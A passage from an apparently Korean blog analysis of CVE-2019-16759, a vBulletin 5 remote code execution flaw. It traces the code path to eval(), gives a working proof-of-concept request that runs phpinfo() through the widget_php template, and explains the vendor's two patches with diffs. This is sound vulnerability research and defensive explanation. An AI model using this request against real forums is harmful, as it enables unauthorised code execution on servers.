class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>includes/vb5/frontend/applicationlight.php</code> 내부에는 위와 같이 isQuickRoute 메서드가 정의되어 있는데 routestring의 값이 <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>이면 ture를 반환해 vB5_Frontend_ApplicationLight::init가 실행이 됩니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(생략)</span></span><br></pre></td></tr></table></figure><p><strong>index.php에서 vB5_Frontend_ApplicationLight::init 메서드가 실행되면 위 __construct 메서드가 실행됩니다. 코드 하단에 보면 <code>routestring</code>의 값이 <code>&#39;ajax/render&#39;</code>이면 handler로 callRender 메서드가 설정되어 있는 것을 볼 수 있습니다. callRender 메서드도 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>callRender 메서드를 보면 $routeInfo에 explode() 메서드를 이용해서 <code>$_REQUEST[&#39;routestring&#39;]</code>의 값을 슬래쉬를 기준으로 잘라 배열로 만들어주고, $params에는 array_merge 메서드를 이용해서 Query String 값과 Raw Data 값을 합쳐 하나의 배열로 만드는 것을 볼 수 있습니다.</strong><br></p><p><strong>그리고 $routeInfo[2]의 값과 $params의 값을 템플릿으로 전송하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>widget_php 템플릿을 확인해보면 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 비어있지 않고, <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>가 비활성화 되어 있으면 다음 코드를 코드를 실행하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>evalCode 메서드는 <code>includes/vb5/frontend/controller/bbcode.php</code> 내에 정의하고 있고, eval 함수를 이용해서 $code 값을 실행시키고, <code>$output</code> 값을 리턴해주는 것을 볼 수 있습니다.</strong><br><br></p><p><strong>결론적으로 RCE를 트리거 하기 위해서는 <code>includes/vb5/frontend/applicationlight.php</code>에서 <code>isQuickRoute</code> 메서드에서 rotuestring의 값이 ‘ajax/render’여야 하고, callRender에서 $routeInfo[2]의 값은 <code>&#39;widget_php&#39;</code>여야 하고, <code>widget_php</code> 템플릿에서는 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 존재해야 하고, eval 함수의 인자 값으로도 <code>$widgetConfig[&#39;code&#39;]</code>가 들어갑니다.</strong><br><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure><p><strong>그리고 사용자 값을 받을 때, $_REQUEST를 이용해서 받아 오기 때문에 GET, POST 메서드를 이용해서 공격을 수행할 수 있습니다. 그러니 GET으로 익스를 하려면 위와 같이 그냥 값을 넘겨 주게 되면 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 참이 반환되는 동시에 vB5_Frontend_ApplicationLight::init가 실행 돼 __construct 메서드가 실행이 될 것이고, __construct 메서드에서도 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 handler를 callRender로 설정하게 됩니다. callRender 메서드에서는 routeInfo[2]의 값으로는 <code>&#39;widget_php&#39;</code>, widgetConfig[‘code’]의 값으로는 <code>&#39;phpinfo();&#39;</code>가 들어가 있어 2개의  widget_php 템플릿으로 전송이 됩니다. widget_php에서는 widgetConfig[‘code’]가 비어있지 않기 때문에 evalCode로 widgetConfig[‘code’]가 전송이 되어 phpinfo(); 함수가 실행이 되며 RCE가 성공적으로 트리거 되게 됩니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a><em>CVE-2019-16759 Patch</em></h2><p><strong>CVE-2019-16759 취약점은 총 2개의 패치가 이루어졌다고 합니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>첫  패치는 <code>clearRegistered</code>라는 함수를 이용해서 widgetConfig라는 값이 사용되면 <code>unset()</code> 함수를 이용해서 제거하고 있습니다. 그러니 Query String 이나 Raw Data로 <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>라는 값이 들어오게 되면 widgetConfig가 존재하기 때문에 <code>unset()</code>에 의해서 제거가 될 것 입니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-<span class="comment">// not sending the data to the template</span></span><br><span class="line">-<span class="comment">// render</span></span><br><span class="line">-<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-));</span><br><span class="line">-Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+);</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+<span class="comment">// not sending the data to the template</span></span><br><span class="line">+<span class="comment">// render</span></span><br><span class="line">+<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+));</span><br><span class="line">+Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br></pre></td></tr></table></figure><p><strong>그리고 두 번째 패치는 <code>$routeInfo[2]</code>(Template Name)의 값으로 <code>widget_php</code>가 들어오게 되면 빈 템플릿과 CSS를 반환하도록 하는 조건문을 추가함으로 0-day에 대응하게 되었습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span 